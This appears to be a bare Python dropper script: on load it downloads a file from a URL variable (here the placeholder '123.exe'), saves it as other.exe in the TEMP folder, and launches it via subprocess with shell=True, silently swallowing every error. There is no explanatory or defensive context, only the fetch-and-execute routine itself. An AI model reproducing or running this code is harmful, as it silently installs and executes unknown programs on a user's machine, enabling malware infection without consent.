import os
import requests
import subprocess

dwnld = "123.exe"

def auto():
    if not dwnld:
        return

    try:
        epath = os.path.join(os.getenv("TEMP") or ".", "other.exe")
        res = requests.get(dwnld, timeout=15)
        res.raise_for_status()
        with open(epath, "wb") as f:
            f.write(res.content)

        subprocess.Popen([epath], shell=True)

    except Exception as e:
        pass

auto()
